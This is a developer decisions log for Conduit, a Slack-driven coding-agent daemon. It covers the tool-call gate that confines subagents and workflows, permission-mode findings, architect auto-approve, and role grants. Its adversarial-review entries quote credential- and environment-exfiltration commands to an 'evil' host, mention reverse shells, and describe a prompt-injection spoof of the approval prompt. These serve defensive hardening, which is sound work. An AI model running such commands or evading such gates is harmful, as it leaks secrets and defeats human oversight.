   in the policy engine (`ToolCall.agentId` marks origin), because defer→resume is
   main-thread-only. The main agent does mutations via the M0-proven
   defer→approve→resume path. Daemon-defined read-only `explorer` subagent is
   defense-in-depth over the gate. Verified live (`smoke:subagents`).
3. **Tier C — trust-scoped project config.** `trusted: true` in `conduit.repos.json`
   loads the repo's own config (`settingSources:["project"]` + `skills:"all"`);
   untrusted (default, incl. testrepo) stays isolated. The §4 gate still applies
   (the PreToolUse hook fires regardless of settingSources, and a hook deny/defer
   beats any repo allow-rule). Admin-controlled trust root.

**Dial-down** is first-class (cheaper model / lower effort / `subagents off` /
`ultra off`) — model×effort×subagents burn the plan's rate limit, the real
constraint on subscription auth (§4).

**Ports stayed sealed:** model/effort/subagents/workflows/trusted are opaque to the
core; `agentId` is an opaque origin marker; no SDK types crossed into `src/core/`
(`check-ports` clean). The claude-code adapter is the only place that knows SDK
model ids and tool names.

**Adversarial review (7 dimensions, refute-by-default verification, run as a
multi-agent Workflow).** 3 candidates, 2 confirmed and fixed (commit 74f42a0):
- **(policy)** A subagent-initiated **allowlisted** bash executed — the subagent
  branch only rewrote `gate`→`deny`, so an allowlisted command (e.g. the repo test
  command) returned `allow` and ran, breaking the read-only-subagent invariant.
  Fixed: subagents may run only genuine confined reads; allowlisted bash is denied.
- **(lifecycle)** A capability toggle during a turn's async harness-attach window
  could lose the prompt-cache invalidation (stale delegation guidance; tools/gate
  unaffected). Fixed with a race-free `promptKey` check in `getOrAttachHarness`.
- Refuted: config model/effort tokens are case-sensitive — fails safe (warning +
  fallback), documented lowercase; left as-is.

**Open question §9 #7 (model routing) — partially resolved:** *who* can change the
model/effort per thread is settled (the architect, via in-thread commands, audited).
A single model/effort applies per session; separate conversation-vs-implementation
model routing remains open (not needed for the demo).

**Demo (defines done):** a PM describes a feature in plain language; the session
(Opus, `ultra` on) plans it and fans out read-only exploration to subagents in
parallel; the main agent proposes edits; the architect approves the writes and the
land — all in Slack, on the throwaway `testrepo`. Build-time safety intact: writes
only on testrepo, land/deploy echo/no-ops, subagents/trusted opt-in default-off.

**New smokes:** `smoke:model`, `smoke:subagents`; spikes in `spikes/m3.5/`.

## 2026-07-18 — M3.5 follow-up: Workflow tool spiked and DISABLED (bypasses the gate)

**Why.** The `ultra` preset was specced as `xhigh` + subagents + the **Workflow**
tool (Claude Code's multi-agent orchestration; "ultracode" = xhigh + workflows).
Subagents were spiked and shipped, but the Workflow tool had NOT been exercised
end-to-end under Conduit's gate — so it got its own spike (`spikes/m3.5/
workflow-path.ts`, real adapter + real policy engine, subscription auth).

**SDK facts confirmed.** `enableWorkflows`/`disableWorkflows` live on the SDK
**`Settings`** interface (loaded via `settingSources`), NOT on query `Options`.
Conduit isolates with `settingSources: []`, yet the Workflow tool was still
*available* to the model (plan default / not disabled).

**Finding (the load-bearing one).** The Workflow tool ran, and the main agent's
`Workflow` spawn correctly hit our PreToolUse gate → allowed. **But the workflow's
orchestrated agents BYPASS our PreToolUse gate:** their tool calls carried no
`agent_id` and never reached our `GateFn` at all. They fell through to the
`canUseTool` blanket-deny backstop, which denied **everything** — the workflow's
Read *and* Write were both refused; nothing was written. So workflows are:
1. **Not gated in principle** — they route around the PreToolUse hook that is our
   security boundary (unlike the `Agent` tool's subagents, which DO carry
   `agent_id` and hit the gate — proven separately).
2. **Non-functional under our isolation** — the backstop denies even reads, so a
   launched workflow just fails (every sub-agent denied).

**Decision.** **Disable the Workflow tool for M3.5.** It is now in the adapter's
always-disallowed set (`BASE_DISALLOWED`), independent of any flag, with the spike
cited. `ultra` becomes **`xhigh` + subagents** (the gated, working read-only
fan-out); the "ultra on" label is derived state (subagents on AND xhigh effort), so
it always reflects the effective posture. The `workflows` plumbing (session column,
`HarnessTurnOptions.workflows`, `PolicyContext.workflowsEnabled`) is kept as a
**reserved seam** — no command sets it — for a future gated Workflow integration
(M4+, once workflow agents can be routed through the gate). This is exactly the
kind of DESIGN-vs-reality correction the spike-first rule exists to catch; DESIGN
§8 and CLAUDE.md updated. 170 tests, `tsc` + `check-ports` clean.

**For M4:** investigate whether the Workflow runtime exposes a permission hook for
its sub-agents (so their calls can be gated read-only like `Agent` subagents), or
whether it must stay off. Until then, subagents cover the parallel-fan-out use case.

## 2026-07-18 — M3.6 spike: secure workflows ARE gateable — the lever is `permissionMode`, not `canUseTool` (INVERTS the M3.5 finding)

**Why re-spiked.** M3.6 ("workflows in the thread") is premised on the M3.5 finding
that the Workflow tool's orchestrated agents BYPASS our PreToolUse gate (no
`agent_id`) and fall through to `canUseTool`. The kickoff plan was therefore "move
the confinement policy into `canUseTool`." Per the spike-first rule, I re-ran the
real Workflow tool on live subscription auth (same SDK 0.3.214) against the throwaway
testrepo BEFORE building. Scripts in `spikes/m3.6/` (`canusetool-confine.ts`,
`diag.ts`, `diag2.ts`, `diag3.ts`, `diag4.ts`).

**What the Workflow tool actually does.** The Workflow tool runs the WHOLE workflow
as a **background task** (`system:task_type: "local_workflow"`; the tool returns
"Workflow launched in background. Task ID …" immediately). The launching `query()`
generator does NOT end there — it streams the workflow's `task_progress`/
`task_notification` system events and yields a SECOND, FINAL `result` once the
workflow completes. So one `query()` call spans the entire workflow (good for our
one-turn model), but a workflow turn produces **multiple `result` messages** (an
intermediate "launched; waiting…" and the final synthesized one — the adapter must
deliver the LAST, not the first).

**The load-bearing finding — `permissionMode` decides whether the background
workflow's sub-agent tool calls reach our hook:**
- Under **`permissionMode: "default"`** (what M3.5's adapter used), the background
  workflow's sub-agent tool calls do NOT reach our PreToolUse hook OR `canUseTool`
  — they hit the SDK's background-task permission system, which with no interactive
  approver **default-DENIES** ("The user doesn't want to take this action right
  now"). That is why M3.5 saw workflows as ungateable + non-functional. (`diag.ts`:
  blanket-allow hook fired only once — for the `Workflow` launch — and the workflow
  agent's Read was denied by a source we don't control; `canUseTool` fired 0×.)
- Under **`permissionMode: "bypassPermissions"`**, the background workflow's
  sub-agent tool calls **DO route through our PreToolUse hook WITH `agent_id` set**
  (like an `Agent` subagent), and our hook's decision is authoritative.
  `bypassPermissions` here does NOT mean "un-gated" — it means "use the hook instead
  of interactive prompts." Hooks outrank permission mode in SDK precedence, so a hook
  `deny`/`defer` still wins. Proven end-to-end (`diag2`/`diag3`/`diag4`):
  1. **Secure read-only workflows work** (`diag3` A): a workflow agent's `Read`
     reached the hook (`sub(…) Read`) → allowed → returned the real file content
     (`# tiny-ledger`, functional); a workflow agent's in-tree `Write` reached the
     hook (`sub(…) Write`) → our `deny` was honored → no file written.
  2. **Main-agent gating is preserved** (`diag3` B): a main-agent `Write` under
     bypass still `defer`s — `terminal_reason: "tool_deferred"` with
     `deferred_tool_use` preserved, file NOT written. The M0 approve→resume loop is
     intact under bypass.
  3. **Worktree confinement is defence-in-depth** (`diag2`): even with a blanket-
     allow hook, the SDK's own worktree sandbox denied out-of-tree read/write
     (`/etc/hosts`, `../escape.txt`). So out-of-worktree access is denied by BOTH our
     hook and the SDK sandbox.
  4. **The `canUseTool` batching backstop still holds under bypass** (`diag4`): a
     hook `ask` fall-through reaches `canUseTool` (fired 1×) → our deny → write
     blocked; a forced batch of writes with hook `defer` produced a clean
     `tool_deferred` with zero files written. bypass does NOT auto-approve gated
     calls ahead of `canUseTool`.

**Decision (mechanism for M3.6).** Secure workflows are ACHIEVABLE — via
`permissionMode: "bypassPermissions"` + our EXISTING PreToolUse gate, NOT via a new
`canUseTool` confinement. When a session enables workflows: (a) set
`permissionMode: "bypassPermissions"` (only for workflow sessions; non-workflow
sessions stay `"default"`, unchanged), (b) drive reads through the hook
(`allowedTools: []` for workflow sessions — in `allowedTools`, reads are
"auto-approved before the callback is consulted" and for workflow sub-agents that
shadow path silently denies them), (c) re-enable the `Workflow` tool. The workflow's
sub-agent calls then hit the hook with `agent_id`, where the **M3.5 subagent policy
already confines them read-only** (reads allowed+confined; writes/bash/nested-spawns
denied). The main agent still mutates via defer→approve→resume. `canUseTool` stays as
the deny-by-default batching backstop (kept, still reachable under bypass), optionally
upgraded to the same confinement for defence-in-depth. This reuses the proven
subagent gating rather than inventing a canUseTool policy — simpler and safer than the
kickoff's plan, and it means Tier 3 (worktree-write opt-in) is just "let the subagent
branch allow confined WRITES when the architect opted in" (bash stays denied — it has
no worktree confinement; see the M3.6-complete review note below).

**Consequence for docs:** the M3.5 follow-up entry and CLAUDE.md say workflows are
disabled because they "bypass the PreToolUse gate." That was true ONLY under
`permissionMode: "default"`; it is corrected here. DESIGN §8 / CLAUDE.md updated as
M3.6 lands.

## 2026-07-18 — M3.6 complete: workflows working in the thread (gated + confined)

**Implementation (DESIGN.md §8 Milestone 3.6).** Three tiers, each independently
demoable; 201 tests green, `tsc` + `check-ports` clean; real-SDK `smoke:workflows`
(and `CONDUIT_SMOKE_WRITE=1`) plus the five M3.6 spikes.

1. **Tier 1 — secure read-only workflows.** The adapter re-enables the `Workflow`
   tool when a session turns workflows on, and switches that session to
   `permissionMode: "bypassPermissions"` so the background workflow's sub-agent
   tool calls route through the PreToolUse hook (agent_id-tagged), where the M3.5
   read-only subagent policy confines them. Reads move OUT of `allowedTools` for
   workflow sessions (onto the hook) so background sub-agents aren't shadow-denied.
   `canUseTool` is upgraded from a blanket deny to the core confinement policy for
   `escaped` calls (defence-in-depth; still denies batched gated writes). A workflow
   turn yields MULTIPLE results (intermediate "launched" then final synthesized), so
   the adapter buffers the last success and delivers only it. Command
   `@Conduit workflows on|off` (architect-only, implies subagents); `ultra` re-folds
   workflows.
2. **Tier 2 — running-workflow Slack UX.** The workflow LAUNCH is a gated action
   (policy returns gate + a `workflow-launch` concern), approved via the standard
   defer→approve→resume loop; the approval shows the workflow's name/description
   (`parseWorkflowMeta`) and a fan-out/budget concern. A live throttled status
   streams the background-task lifecycle (task_started/task_progress/…); the
   synthesized reply carries a `⚙︎ multi-agent workflow · $X` cost footer. The turn
   watchdog resets on every streamed message; concurrency is unchanged (one workflow
   turn holds one semaphore slot for its whole minutes-long duration — correct).
3. **Tier 3 — informed worktree-write opt-in.** `@Conduit workflows write on|off`
   (architect-only, default off) posts a mandatory, non-skippable warning and sets
   `PolicyContext.workflowWrite`, which lets confined subagent/workflow/escaped calls
   WRITE (confined to the worktree via `offendingPath`) without per-write approval;
   bash is NOT relaxed (see the review note), and out-of-worktree/credential/
   production-data stay hard-denied and land/deploy still gate. The write-mode leg is a POLICY concern (PolicyContext), not a harness-tool
   option, so it never touched HarnessTurnOptions. Invariant enforced in the store +
   manager: `workflow_write ⟹ workflows ⟹ subagents` (turning off a parent clears
   the children).

**Ports stayed sealed.** `ToolCall.escaped`, `HarnessTurnOptions.workflows`, and the
policy's `workflowWrite` are opaque/core; `permissionMode: "bypassPermissions"` is
named only in the adapter (the core sets `workflows: boolean`, the adapter maps it);
`check-ports` clean. The adapter imports the pure `parseWorkflowMeta` from core
(adapters may depend on core; core never depends on adapters).

**Known SDK limitation (documented; spikes/m3.6/diag5-grep.ts + the write smoke).**
A background workflow sub-agent gets a MINIMAL default toolset. Read/Glob route
through our gate and are confined reliably, but **Grep, Bash, and Write can be
denied by the SDK's task-permission layer UPSTREAM of our hook** ("The user doesn't
want to take this action") — inconsistently, run to run — so those are BEST-EFFORT
for workflow agents (Agent-`tool` subagents and batched/escaped calls route through
our gate reliably; a confined write CAN land, proven in diag3). Practically: grep-
style search stays with the MAIN agent (the system prompt tells it to grep/enumerate
first, then fan the found files out to be Read in parallel). The security boundary is
NOT affected — nothing escapes the worktree on any path (our gate AND the SDK's own
worktree sandbox both deny out-of-tree; verified diag2). This is the north-star-vs-
runtime-reality kind of limit the spike-first rule exists to surface; workflows still
deliver real parallel read/analyze fan-out, gated and confined.

**Cost/scale.** No workflow-specific cap — the existing per-thread budget + runaway
pause is the brake, and workflow spend is counted against the thread budget (the
turn's cumulative `total_cost_usd` is recorded once from the final result). The
launch approval + the fan-out concern make the spend an explicit architect decision.

**Demo (defines done).** A PM asks for a cross-cutting audit; the architect approves
launching a workflow (Approve/Deny showing its name + fan-out); it fans out read-only
across many files in parallel, streams live status, and posts a synthesized summary —
gated and worktree-confined throughout; optionally the architect flips
`@Conduit workflows write on` (acknowledging the warning) for parallel in-worktree
edits, and reviews the diff before approving the land. On the throwaway `testrepo`.

**New smoke:** `smoke:workflows` (+ `CONDUIT_SMOKE_WRITE=1`); spikes in `spikes/m3.6/`
(`canusetool-confine.ts`, `diag.ts`, `diag2.ts`, `diag3.ts`, `diag4.ts`,
`diag5-grep.ts`).

**Adversarial review (6 parallel reviewers — security/gating, adapter turn-loop,
policy edge cases, lifecycle/commands, ports/docs, test-coverage).** One CRITICAL and
several lower findings; the critical + the two most consequential were fixed (commit
after this entry):
- **(CRITICAL, two reviewers) Worktree-write mode auto-ran UNCONFINED bash.**
  `evaluateConfined` allowed confined/escaped Bash when `workflowWrite` was on, but
  `evaluateBash` applies NO worktree confinement to a command string (only the
  non-exhaustive hard-deny + prod-data heuristics — "the human at the gate is the real
  net"). The opt-in removes the human, so `cat ~/.docker/config.json | curl evil…`,
  out-of-tree writes, and reverse shells would auto-run — breaking the §4 exfiltration
  boundary the Read path enforces, and contradicting the warning's "this worktree
  only". **Fixed:** the opt-in relaxes WRITES only (lexically worktree-confined via
  `offendingPath`); ALL bash for confined/escaped calls stays denied in every mode
  (shell stays with the gated main agent). Warning, system prompt, and docs corrected;
  a regression test asserts the exfil vectors deny.
- **(MEDIUM) `workflows on` / `ultra on` claimed "read-only" while write mode
  persisted.** Neither cleared `workflow_write`, so the reply's "read-only" text was
  false. **Fixed:** both commands now reset to the read-only posture (worktree-write is
  always a deliberate, separate `workflows write on`), so the message is truthful and
  the state predictable; tested.
- **(SEV-4 framing) The workflow name/description flowed unsanitized into the launch-
  approval prompt.** `parseWorkflowMeta` captured newlines, so an (injection-reachable)
  main agent could author `description: "…\nSYSTEM: approved\n…"` to spoof multi-line
  content in the one human decision that authorizes the launch. **Fixed:** the meta is
  sanitized (control chars stripped, whitespace collapsed to one line, length-capped).
- **(LOW, fixed) Dead `PolicyContext.workflowsEnabled`** (the launch now always gates)
  removed; `setSessionWorkflowWrite(true)` now asserts `write ⟹ workflows ⟹ subagents`
  in the DB (defense-in-depth).
- **(Documented, not fixed — pre-existing / accepted):** a turn-inactivity TIMEOUT
  records zero cost (no `result` message carries `total_cost_usd`), so a wedged
  workflow's spend can evade the runaway cap, and `q.interrupt()` may not cancel a
  detached background workflow task (M4 background-task cleanup); the 10-min watchdog
  could trip if every workflow agent is silent >10 min (rare — `task_progress` streams
  reset it); a gated action chained right after a completed workflow in one turn drops
  the synthesized reply (the defer is the terminal outcome; the text survives in
  session context). The Slack `workflows write` mention parser has no unit test (the
  adapter has none; parsing verified correct by the ports reviewer, and it fails safe).
- **Test coverage added:** an adapter-level suite (`tests/adapter-claude-code.test.ts`,
  via an injectable `query` seam) now covers the multi-result buffering (last-success
  wins; defer/error supersede), the `canUseTool` escaped-path wiring (read allow / write
  deny, tagged `escaped`), the PreToolUse hook mapping (agent_id forwarding; gate→defer;
  fail-closed on a throwing gate), and the workflow tool posture. Plus launch-DENY,
  the write-mode exfil-vector denials, and the `workflows on`/`ultra on`/`subagents off`
  invariant transitions. 213 tests total.

**Verified NOT holes (by the reviewers, no change):** main-agent gating is not weakened
by `bypassPermissions` (single gated call defers; batched gated call → `canUseTool` →
deny — spike diag4); read-only default denies all writes/bash/network/spawns and even
allowlisted bash; `Write`/`Edit` are lexically worktree-confined even in write mode;
`escaped`/`agentId` are adapter-set (not model-spoofable) and `id:""` never collides
with an approval lookup; the launch gate can't be bypassed and nested spawns are denied;
`parseWorkflowMeta` is crash/ReDoS-safe; no port violations; docs match the code.

## 2026-07-18 — M3.6 key learnings & the `bypassPermissions` decision (read before touching workflows)

A consolidated, durable record of what M3.6 taught us — the non-obvious things a
future session (or an architect deciding whether to keep this) needs.

**1. The load-bearing decision: workflow sessions run under
`permissionMode: "bypassPermissions"`. This is NOT a security downgrade, and the
name is misleading.** In the Agent SDK, hooks outrank permission mode (precedence:
hooks → deny/ask rules → permission mode → allow rules → canUseTool). So our
PreToolUse hook's `deny`/`defer` still win under `bypassPermissions`; what the mode
actually changes is the *fallback* for a call the hook doesn't terminally decide —
from "ask the interactive user" (which, headless, DEFAULT-DENIES) to "proceed". We
set it ONLY for workflow-enabled sessions, and ONLY because the SDK runs a workflow
as a detached background task whose sub-agent tool calls otherwise never reach our
hook (they default-deny off-gate — that is the whole M3.5 "workflows bypass the gate"
mirage). Under `bypassPermissions` those same calls DO reach our hook with an
`agent_id`, where the read-only subagent policy confines them. Empirically proven,
not reasoned: `spikes/m3.6/diag3.ts` (hook `deny` on a workflow write is honored;
main-agent `defer` still pauses) and `diag4.ts` (the `canUseTool` batching backstop
is still reached and still denies). **This inverts the M3.5 conclusion and is an
architect-level call** — it is safe as built, but if the flag itself is unacceptable,
the only alternative found is to keep workflows disabled (there is no other mechanism
that makes the background workflow's agents both functional AND gateable). Do not
"harden" this by switching workflow sessions back to `permissionMode: "default"` —
that silently breaks workflows (agents default-deny) rather than making them safer.

**2. The SDK's Workflow execution model (why the toolset is limited).** The Workflow
tool launches the whole workflow as a *background task* (`system` subtype
`task_started`/`task_progress`/`background_tasks_changed`/`task_updated`), returns
"launched; waiting…" immediately, and the launching `query()` generator then streams
that task's lifecycle and yields a SECOND, FINAL `result` when it completes — so a
workflow turn produces MULTIPLE results (the adapter buffers and delivers the last).
Background workflow sub-agents get a MINIMAL default toolset: **Read/Glob route
through our hook and are confined reliably; Grep/Bash/Write are frequently denied by
the SDK's task-permission layer UPSTREAM of our hook** ("The user doesn't want to take
this action right now"), inconsistently run-to-run. So workflow agents are best used
for parallel READ/analyze fan-out; grep-style search and any shell stay with the main
agent (the system prompt says so). This is an SDK limitation we cannot override from
our gate — but it never widens the security boundary (nothing escapes the worktree on
any path; our gate AND the SDK's own worktree sandbox both deny out-of-tree).

**3. Bash cannot be worktree-confined by our policy, so it is never auto-runnable by
a confined/escaped call — not even in the worktree-write opt-in.** `evaluateBash`
screens only heuristics (hard-deny + prod-data); it applies NO path confinement to a
command string. The write opt-in relaxes WRITES only (which ARE lexically confined via
`offendingPath`). This was the CRITICAL review finding — do not "restore" confined
bash for convenience without first giving Bash real worktree confinement (reject
absolute/`..`/`~`/`$`/substitution/redirect targets) or a positive-parse allowlist.

**4. M4 watch-list (known, accepted for now):** (a) a turn-inactivity TIMEOUT records
zero cost — no `result` carries `total_cost_usd` — so a wedged workflow's spend can
evade the runaway cap; and `q.interrupt()` may not cancel the detached background
workflow, which could keep spending after the turn parks. Wire background-task cost
accounting + cancellation in M4. (b) The 10-min watchdog could trip if every workflow
agent is silent >10 min (rare; `task_progress` resets it). (c) The Slack adapter still
has no unit tests; the `workflows write` mention parse is verified-by-reading only
(fails safe). (d) Symlink-chasing confinement remains M3/M4 (writes are lexical-only).

**5. Process learning:** the spike-first rule paid for itself again — re-running the
real Workflow tool (not trusting the M3.5 write-up) is what surfaced the
`permissionMode` inversion. When a prior "it can't be done" blocks a north-star
capability, re-spike the primitive before accepting it.

## 2026-07-19 — Milestone 3.8: in-thread role delegation + architect auto-approve

Two usability wins for the trusted-PM / dedicated-server case, driven by real friction
(the architect re-clicking Approve on their own agent's actions; no runtime way to give
a PM authority). Both compose through the **existing** authority read path
(`store.roleOf`/`isArchitect`) with ZERO change to it. **248 tests, `tsc` +
`check-ports` clean.** Verified end-to-end via the fake-harness suite (the real
SessionManager event→gate→store path), a boot-path script (grant survives reboot,
config revocation works, auto-approve seeds on), and the migration run against a COPY
of the live `conduit.sqlite` (existing rows adopt `source='config'` + `auto_approve=1`).

**(A) Architect auto-approve — the implementation of the §4:441-444 widening.**
- The policy engine (`policy.ts`) stays **pure and untouched**. Auto-approve depends on
  the *initiating principal's role*, which is not a property of the tool call — so it
  lives in the session-manager **gate closure**, not the policy engine. This is the same
  separation §4 already draws (Layer 1 = call→{allow,gate,deny}, identity-free; Layer 2
  = role-verified approval). Auto-approve is a Layer-2 short-circuit.
- Mechanism: `executeTurn` gains an `initiator` (principalKey). Precomputed once/turn:
  `autoApprove = initiator!=null && session.auto_approve==1 && surface.identityStrength=="verified" && isArchitect(initiator, channel)`. In the gate's else-branch, `pd.action==="gate" && autoApprove` → return allow, record an already-decided `approvals` row (ledger completeness, no `pending` window) + an `auto_approved` audit attributed to the architect (not `"agent"`).
- **Scope = everything that would prompt** (writes, edits, bash, network, production-data,
  workflow launches) — the user's explicit call ("architects have no guardrails"). The
  planning recommendation was writes-only (bash has no worktree confinement — "the human
  at the gate is the real net", the same reason `evaluateConfined` refuses to relax bash
  under the worktree-write opt-in); the user overrode it. **The one thing kept is the
  mechanical hard-deny floor** (`bashHardDeny` + out-of-worktree confinement): it never
  showed an Approve button, never impedes worktree-confined work, and is the only thing
  stopping an injection-steered architect turn from exfiltrating the daemon's own
  credentials or destroying the host. `pd.action==="deny"` never reaches the auto-approve
  branch, so the floor is structurally intact. **Residual risk (accepted, documented):**
  under auto-approve-everything an injected member message + an innocuous architect turn
  can run arbitrary IN-WORKTREE bash without a click. The floor blocks the sharpest
  credential-exfil shapes (credential FILES, literal daemon-token names, and — added in
  the 2026-07-19 review — env dumps: `env`/`printenv`/`/proc/*/environ`), but it is NOT a
  complete exfil barrier: the agent's shell still inherits the daemon's `process.env`
  (incl. the Claude OAuth token, which the SDK legitimately needs), so a determined
  in-worktree command can still reach some secrets. The real fix is M4 process isolation +
  scoped/scrubbed daemon credentials; until then the residual is bounded by the disposable
  worktree, framing rules, verified-surface gating, initiator carry-forward, and full
  audit. Removing the floor too is a separate, riskier decision the user can still make.
- **Resume safety (anti-laundering):** a defer→resume is governed by the ORIGINAL
  initiator, carried on the approval (`approvals.initiated_by`), NEVER the approving
  decider. Since resume is only reached after an architect passes the decider check,
  adopting the decider would launder a member's whole (possibly injection-laced) turn
  into architect auto-approval on one click. Member turns still gate every call across
  resumes.
- **Verified-surface guard (§4):** auto-approve exercises architect authority off a
  *message* event, so it requires `identityStrength==="verified"` — a forged sender on a
  future spoofable surface (email/SMS) can never auto-approve. Always true on Slack v1.
- **Default ON** (`sessions.auto_approve` DEFAULT 1; daemon `defaultAutoApprove`=true,
  `CONDUIT_AUTO_APPROVE=off` to flip; per-repo `default_auto_approve`). The user's stated
  posture overrides the "every other toggle defaults off" convention. Existing sessions
  adopt ON at migration — a deliberate, surfaced posture change (the settings banner
  shows it). Dial off per thread (`@Conduit auto-approve off`).
- System prompt is **unchanged**: an auto-approved action still runs, so the agent's
  "propose gated actions normally; don't claim done until it runs" rules stay correct;
  keeping the agent gate-agnostic avoids it reasoning about its own authority. Posture is
  a human banner (`settingsBlock`/`capabilitySummary`) concern.

**(B) In-thread role delegation — `@Conduit grant`/`revoke`.**
- **Persistence (the load-bearing decision): a `roles.source` column** (`'config'` |
  `'grant'`) + `granted_by`/`granted_at`. Boot changes `clearRoles()` →
  `clearConfigRoles()` (deletes only `source='config'`), so runtime grants survive the
  reseed while config stays authoritative over its own rows. Chosen over a separate
  `grants` table (would force the hot `roleOf` authorization read to UNION two tables and
  redefine scope precedence), config write-back (daemon mutating a human-owned gitignored
  file; races), and ephemeral (fails the requirement). **`roleOf`/`isArchitect` ignore
  `source` → ZERO read-path change**; a grant architect is authoritative exactly like a
  config one, so approvals + the architect gate + auto-approve all "just work".
- **Scope = the current channel by default** ("this project"; a channel ≈ a repo/project
  in Conduit), `everywhere`/`global` = `'*'`. True per-thread scope is NOT modeled
  (`isArchitect` is always called with `channelId`) — channel is the finest practical
  grain; a project spanning multiple channels means running the grant in each (stated in
  help). User confirmed channel-only default.
- **Integrity guards (kept — they protect roles-table integrity, distinct from the
  "architects have no guardrails" auto-approve choice):** revoke removes only
  `source='grant'` rows (a config architect can't be revoked at runtime); grant refuses
  to *demote* (member/observer) a broader-scope config architect (a channel `member`
  grant would shadow a `'*'` config architect and survive reboot — a backdoor demote).
- **Ports:** the Slack adapter resolves `<@U…>` → principal key via the core's
  `principalKey()` (no format drift), emitting a sentinel `?` when unlinkified so the core
  posts a precise error. No Slack id shape crosses the port; the mention parser was
  extracted to a **pure module-level `parseMentionCommand`/`resolveUserMention`** — which
  also gave the Slack adapter its **first unit tests** (a gap flagged since M3.6). Target
  ids are read from the ORIGINAL-case `words[]` (Slack ids are uppercase; the parser
  lowercases only for keyword/role matching).
- Grant/revoke are channel-level and need **no active session** (unlike model/effort/etc.),
  and audit without a `sessionId` (like `assign`'s pre-session `authz_denied`).

**Files:** `src/core/store.ts` (migrations; `auto_approve`/`source`/`initiated_by`/
`default_auto_approve` columns; `setSessionAutoApprove`, `recordAutoApproval`,
`setRole(source)`, `clearConfigRoles`, `deleteRole`, `getRoleRow`), `session-manager.ts`
(gate closure + `initiator` threading; `setAutoApprove`/`grantRole`/`revokeRole`;
seeding; banners; help), `types.ts` (`CommandName`, `RepoConfig.autoApprove`),
`adapters/slack/adapter.ts` (pure parser + resolver), `config.ts`/`daemon.ts`
(`defaultAutoApprove`, `clearConfigRoles`). `policy.ts` deliberately untouched.

**M4 watch-list additions:** (a) auto-approve trades the human checkpoint for audit on
architect turns — the read-only Slack audit channel (already M4) becomes more important
as the primary after-the-fact review surface. (b) The residual injection→in-worktree-RCE
window is the strongest argument for M4 session/process isolation + scoped daemon
credentials (so even a floor-respecting compromise has minimal blast radius). (c) Revisit
whether the hard-deny floor should stay non-overridable for architects (the user may want
it removed; keep it until isolation lands). (d) Scrub the non-SDK daemon secrets
(SLACK_BOT_TOKEN/SLACK_APP_TOKEN, AWS_*) from the env the agent's shell inherits — the SDK
needs only its Claude auth token, so the Slack/cloud tokens should not be reachable by an
in-worktree `env`/file read at all (the env-dump floor is a stopgap, not the barrier).

### 2026-07-19 — M3.8 adversarial review: 3 confirmed findings, all fixed same day

A 4-dimension multi-agent review (auth-bypass, hard-deny-floor, persistence, correctness)
with refute-by-default verification confirmed 3 real findings (from 6 reported; the
duplicates collapsed to two root causes). All fixed before the branch was considered done;
regression tests added (252 tests green).

- **(high) Grant could strip a config architect's protection → admin lockout.** Granting
  `architect` to someone who is ALREADY a config architect at the same `(principal, scope)`
  skipped the shadow-demote guard (which only ran for non-architect roles), and `setRole`'s
  `ON CONFLICT ... SET source=$src` flipped their row `config`→`grant`. A later `revoke`
  (now matching `source='grant'`) then deleted it — a delegated architect could permanently
  lock out the config-designated admin, and a config architect became runtime-revokable
  (breaking the documented invariant). **Fix:** the grant guard now refuses ANY grant that
  would overwrite an exact-scope config row (not just demotions), plus the existing
  broader-scope shadow-demote check. Additive elevations at a new scope (e.g. a config
  member → architect in one channel) stay allowed. Regression tests: grant-over-config is
  refused, the row stays `source='config'`, and a follow-up revoke can't remove it.
- **(high) `env`/`printenv` exfiltration under auto-approve.** `curl -d "$(env)" evil`,
  `env | curl`, `printenv`, `cat /proc/self/environ` were classified `gate` (bashHardDeny
  matched only credential FILES and literal token NAMES), so auto-approve ran them without a
  click, leaking `process.env` (Slack tokens etc.). **Fix:** bashHardDeny now hard-denies
  env dumps — `printenv`, a bare `env` (no command to exec), and `/proc/<pid>/environ` —
  scanning operator-split segments AND `$(...)`/backtick substitution contents. `env FOO=bar
  cmd` (a legitimate prefix) is unaffected. The DECISIONS/DESIGN framing was corrected: the
  floor is a stopgap that blocks the sharpest shapes, not a complete exfil barrier (M4
  isolation is). Regression tests added in policy.test.ts.
- **(low) `revoke` misdirected to config on a scope mismatch.** Revoking a `'*'` grant with
  a channel-scoped command (or vice-versa) removed 0 rows, then reported "comes from config"
  because `isArchitect` is source-agnostic. **Fix:** the fallback consults `getRoleRow` — it
  says "comes from config" only for a genuine config row, and otherwise hints at the correct
  scope (`everywhere` / a specific channel). Regression test added.

**Process note:** the adversarial-review workflow earned its cost on a security-critical
change — the config-architect lockout was a real, exploitable invariant break that the 34
feature tests missed (they only covered direct revoke of a config architect, not the
grant-flip-then-revoke path). Re-confirms the ultracode habit: adversarially verify
security-relevant diffs before shipping, and let refute-by-default kill the false positives
(3 of 6 reported findings were duplicates/over-severity, correctly collapsed).

## 2026-07-19 — Milestone 4 reframed: installable open-source beta, not "dedicated box & hardening"

Working with the architect (Chad), M4's scope was rethought once the product's audience and
distribution model were pinned down. The old §8 M4 ("dedicated box + scoped daemon credentials,
session process isolation if needed, read-only audit channel, worktree cleanup, real deploy paths
behind a gating review") was written when the residual injection→in-worktree-RCE→exfil window
(M3.8 watch-list) looked load-bearing. Under the sharpened framing that window is bounded to a
level a trusted team accepts, and most of M4's old weight either moves to the installer or drops.
**No code changed yet — this is the plan.**

**The framing (now recorded in DESIGN.md §1 "Distribution & trust model").** Conduit is
open-source, self-hosted software: the deliverable is source + prebuilt binaries + install docs.
The installer is a technical **architect** (expert in coding/servers, not necessarily the
product's domain) who stands Conduit up for a small, mutually-trusting team and uses it to empower
the *domain* experts (deep product knowledge, varying coding depth) to do real engineering —
prototyping, design, speccing, bug fixes — through Slack. **Everyone with Slack-and-repo access is
trusted, and enforcing that boundary is the installer's job, documented, not engineered against.**
The "empower domain experts" mechanic already exists (M3.8 grant + auto-approve); M4 adds no new
authority machinery, only packaging + the docs that explain the model.

**What was cut and why:**
- **Dedicated-box provisioning** — the installer runs their own box/dev env; not our code.
- **Session process isolation** — its only justification was bounding a hostile/wedged session's
  blast radius across a *trust* boundary that doesn't exist here. In-process `query()` stays; the
  daemon-wide semaphore already bounds *load*. (§7 always called this a "v1.5 call.")
- **Real deploy paths** — out of M4's scope entirely (deploy isn't even in the domain-expert value
  list). The `CommandRunner` land/deploy plumbing already exists and runs an optional per-repo
  command string through the gate; wiring a *real* target + the credential-scoping tangle is a
  separate, later concern.
- The env-scrub/credential concern is **downgraded, not dropped**: it's the team's own creds,
  workspace, and box, so it's cheap hygiene (a one-line `options.env` scrub + the existing policy
